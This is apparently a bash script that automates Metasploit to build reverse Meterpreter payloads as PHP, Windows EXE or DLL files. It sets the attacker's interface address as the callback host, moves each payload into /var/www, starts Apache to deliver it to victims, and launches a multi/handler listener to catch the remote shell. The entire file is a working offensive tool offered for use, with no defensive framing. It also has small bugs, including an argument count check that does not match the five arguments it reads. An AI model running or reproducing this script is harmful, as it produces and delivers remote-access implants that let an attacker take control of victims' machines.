#!/bin/bash
#Script to generate reverse payload and launch multihandler from metasploit
#Usage ./script port
#by n0b1dy
if [ $# -ne 4 ]; then
echo "[*]Usage: $0 <port> <e(X)e|(P)hp|(D)ll> <filename> <eth{1}|{tap0}> <(H)http|(S)https | Default tcp>"
exit
fi
start=`date`


echo "[*]---------------------------------[*]"
port=$1
type=$2
filename=$3
interface=$4
reverse=$5
stage="reverse_tcp"

if [ $reverse == 'H' ]; then
echo "[!]Reverse HTTP Payload Selected"
stage="reverse_http"
fi

if [ $reverse == 'S' ]; then
echo "[!]Reverse HTTPS Payload Selected"
stage="reverse_https"
fi

echo "[+]Reverse Payload Generator.[$start]"
#saves current directory
dir=`echo $PWD`
#calculates target ip by default interface
attacker=`ifconfig $4 | grep "inet " | cut -d: -f2 | cut -d" " -f1`
echo "[+]$attacker[=]--|--[$port]$filename.victim[=]"
MSFPAY=`which msfpayload`
MSFCLI=`which msfcli`
if [ $type == 'P' ]; then
echo "[+]Wait till we are Generating the [$filename].php"
$MSFPAY php/meterpreter/$stage LHOST=$attacker LPORT=$port R > $dir/$filename.php.txt
echo "[+]Transfer the $filename.php.txt to /var/www for delivery and starting webserver"
mv $filename.php.txt /var/www
/etc/init.d/apache2 start
echo "[+]Launching multihandler"
$MSFCLI multi/handler PAYLOAD=php/meterpreter/$stage LHOST=$attacker LPORT=$port E
end=`date`
clear
echo "[*]Reverse Phun Generator.[$end]"
exit
fi
if [ $type == 'X' ]; then
#PrependMigrate=TRUE in order to migrate immediately to a new process
echo "[+]Wait till we are Generating the [$filename].exe"
$MSFPAY windows/meterpreter/$stage LHOST=$attacker LPORT=$port AutoLoginScript="migrate -f" X > $dir/$filename.exe
#  windows/x64/
echo "[+]Transfer the $filename.exe to /var/www for delivery and starting web server"
mv $filename.exe /var/www
/etc/init.d/apache2 start
echo "[+]Launching multihandler"
$MSFCLI multi/handler PAYLOAD=windows/meterpreter/$stage LHOST=$attacker LPORT=$port E
end=`date`
clear
echo "[*]Reverse Phun Generator.[$end]"
exit
fi

if [ $type == 'D' ]; then

echo "[+]Wait till we are Generating the [$filename].dll"
$MSFPAY windows/meterpreter/$stage LHOST=$attacker LPORT=$port D > $dir/$filename.dll
echo "[+]Transfer the $filename.exe to /var/www for delivery and starting web server"
mv $filename.dll /var/www
/etc/init.d/apache2 start
echo "[+]Launching multihandler"
$MSFCLI multi/handler PAYLOAD=windows/meterpreter/$stage LHOST=$attacker LPORT=$port E
end=`date`
clear
echo "[*]Reverse Phun Generator.[$end]"
exit
fi

